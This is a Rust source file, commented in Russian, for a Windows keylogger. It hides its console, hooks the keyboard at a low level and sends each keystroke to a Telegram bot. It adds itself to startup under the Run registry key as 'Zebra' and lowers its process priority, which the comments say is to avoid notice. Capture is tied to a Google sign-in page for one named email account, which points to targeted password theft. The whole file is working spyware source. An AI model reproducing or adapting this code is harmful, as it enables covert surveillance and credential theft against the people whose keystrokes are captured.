// это нужно чтобы не отображалась консоль
#![windows_subsystem = "windows"]

extern crate winapi;

use winapi::um::winuser::{CallNextHookEx, GetAsyncKeyState, GetKeyState, SetWindowsHookExA, UnhookWindowsHookEx, WH_KEYBOARD_LL, HC_ACTION, WM_SYSKEYDOWN, WM_KEYDOWN, KBDLLHOOKSTRUCT};
use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM};
use winapi::shared::windef::HHOOK;
use winapi::um::winuser::{DispatchMessageA, GetMessageA, TranslateMessage, MSG};

// для telegram
use tokio;

// определение url
use std::ptr::null_mut;

// для автозапуска
use winreg::enums::*;
use winreg::RegKey;

// для скрытия
use winapi::um::processthreadsapi::{GetCurrentProcess, SetPriorityClass};
use winapi::um::winbase::BELOW_NORMAL_PRIORITY_CLASS;

mod config;
mod tg;
mod sites;

// Распознавание клавиш
unsafe extern "system" fn key_recognition(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {

    // для определения зашёл он или нет
    let url = "https://accounts.google.com/v3/signin/identifier?Email=amelchakov%40fmschool72.ru&continue=https%3A%2F%2Fwww.google.com%2F&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S992212922%3A1740144921379976&ddm=1";
    if (n_code == HC_ACTION && (w_param == WM_SYSKEYDOWN as usize || w_param == WM_KEYDOWN as usize)) && !sites::is_site_open(url) {
        let keyboard = &*(l_param as *const KBDLLHOOKSTRUCT);
        let is_caps_lock = (GetKeyState(winapi::um::winuser::VK_CAPITAL) & 0x0001) != 0;
        let is_shift_pressed = (GetAsyncKeyState(winapi::um::winuser::VK_SHIFT) & 0x8000u16 as i16) != 0;

        // определение caps_lock
        if is_caps_lock {
            tokio::spawn(tg::bot_sender(String::from("(Caps Lock) ")));
        }

        // shift или не shift и вывод key pressed
        if is_shift_pressed && is_any_key_pressed() {
            if keyboard.vkCode == 164 {
                tokio::spawn(tg::bot_sender(String::from("(Shift) Key pressed: Alt")));
            } else {
                let output = format!("(Shift) Key pressed: {}", keyboard.vkCode as u8 as char);
                tokio::spawn(tg::bot_sender(output));
            }
        } else {
            let output = format!("Key pressed: {}", keyboard.vkCode as u8 as char);
            match keyboard.vkCode {
                9 => tokio::spawn(tg::bot_sender(String::from("Key pressed: Tab"))),
                20 => tokio::spawn(tg::bot_sender(String::from("Key pressed: Caps Lock"))),
                160 => tokio::spawn(tg::bot_sender(String::from("Key pressed: Shift"))),
                162 => tokio::spawn(tg::bot_sender(String::from("Key pressed: Ctrl"))),
                164 => tokio::spawn(tg::bot_sender(String::from("Key pressed: Alt"))),
                32 => tokio::spawn(tg::bot_sender(String::from("Key pressed: Space"))),
                27 => tokio::spawn(tg::bot_sender(String::from("Key pressed: Esc"))),
                8 => tokio::spawn(tg::bot_sender(String::from("Key pressed: Backspace"))),
                13 => tokio::spawn(tg::bot_sender(String::from("Key pressed: Enter"))),
                _ => tokio::spawn(tg::bot_sender(output)),
            };
        }
    }
    CallNextHookEx(null_mut(), n_code, w_param, l_param)
}

// Какая нибудь клавиша кроме Shift нажата?
fn is_any_key_pressed() -> bool {
    for i in 0..256 {
        unsafe {
            if (GetAsyncKeyState(i) & 0x8000u16 as i16) != 0 && i != winapi::um::winuser::VK_SHIFT {
                return true;
            }
        }
    }
    false
}

// Закидываем удочку (начинаем записывать клавиши)
fn set_hook() -> HHOOK {
    unsafe {
        let instance = GetModuleHandleA(null_mut());
        SetWindowsHookExA(WH_KEYBOARD_LL, Some(key_recognition), instance, 0)
    }
}

// убираем удочку (остановка)
fn release_hook(hook: HHOOK) {
    unsafe {
        UnhookWindowsHookEx(hook);
    }
}


// функция добавления в автозапуск
fn add_to_startup() -> Result<(), Box<dyn std::error::Error>> {
    let exe_path = std::env::current_exe()?;
    let exe_path_str = exe_path.to_str().ok_or("Invalid executable path")?;

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = r"Software\Microsoft\Windows\CurrentVersion\Run";
    let (key, _) = hkcu.create_subkey(path)?;

    key.set_value("Zebra", &exe_path_str)?;

    Ok(())
}



#[tokio::main]
async fn main() {
    let len = 0;

    // Снижаем приоритет процесса, чтобы сделать его менее заметным
    unsafe {
        let process = GetCurrentProcess();
        SetPriorityClass(process, BELOW_NORMAL_PRIORITY_CLASS);
    }

    // Добавление в автозапуск
    if let Err(e) = add_to_startup() {
        tokio::spawn(tg::bot_sender(String::from("Failed to add to startup")));
    } else {
        tokio::spawn(tg::bot_sender(String::from("Added to startup successfully")));
    }

    // Запускаем `check` в фоне
    tokio::spawn(async move {
        loop {
            tg::check(len).await;
        }
    });

    // закидываем удочку
    let hook = set_hook();
    if hook.is_null() {
        tokio::spawn(tg::bot_sender(String::from("Failed to install hook!")));
        return;
    }

    // выводим нажатые
    unsafe {
        let mut msg: MSG = std::mem::zeroed();
        while GetMessageA(&mut msg, null_mut(), 0, 0) != 0 {
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }
    }

    // остановка
    release_hook(hook);
}
